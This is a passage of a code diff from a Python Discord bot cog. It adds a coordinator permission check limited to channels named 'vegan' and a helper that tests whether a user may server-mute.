+        coordinator_channel_ids = row["coordinator_channel_ids"] or []
+        is_coordinator = (user_id in coordinator_ids) and (channel_id in coordinator_channel_ids)
+        is_vegan_channel = "vegan" in channel.name.lower()
+        if is_coordinator and is_vegan_channel:
+            return True
+        else:
+            return False
+
+    @staticmethod
+    def can_server_mute(ctx):
+        cog = ctx.bot.get_cog('Hybrid')
+        return cog and ctx.author.id in cog.server_muters.get(ctx.guild.id, set())
 
 async def setup(bot: DiscordBot):
     cog = Hybrid(bot)
